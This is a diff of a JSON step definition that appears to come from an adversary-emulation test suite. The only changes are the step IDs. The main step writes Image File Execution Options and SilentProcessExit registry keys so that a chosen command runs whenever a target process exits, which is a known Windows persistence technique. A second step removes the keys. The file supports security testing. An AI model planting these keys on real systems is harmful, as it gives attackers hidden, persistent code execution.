@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "cf99f8ff-9e5c-44c3-83b6-920821c71cbb",
+      "id": "b3807705-44d8-4070-87a7-1f34009dd1d7",
       "type": "execute-command",
       "data": {
         "command": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "bda33a66-52eb-4755-8289-063ceafa9b08",
+      "id": "f27a5c0b-af6d-4d47-9e8c-607435135ad1",
       "type": "execute-command",
       "data": {
         "command": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "cf99f8ff-9e5c-44c3-83b6-920821c71cbb",
+      "s": "b3807705-44d8-4070-87a7-1f34009dd1d7",
       "p": "on-success",
-      "o": "bda33a66-52eb-4755-8289-063ceafa9b08"
+      "o": "f27a5c0b-af6d-4d47-9e8c-607435135ad1"
     },
     {
-      "s": "cf99f8ff-9e5c-44c3-83b6-920821c71cbb",
+      "s": "b3807705-44d8-4070-87a7-1f34009dd1d7",
       "p": "on-failure",
-      "o": "bda33a66-52eb-4755-8289-063ceafa9b08"
+      "o": "f27a5c0b-af6d-4d47-9e8c-607435135ad1"
     }
   ],
   "tags": [
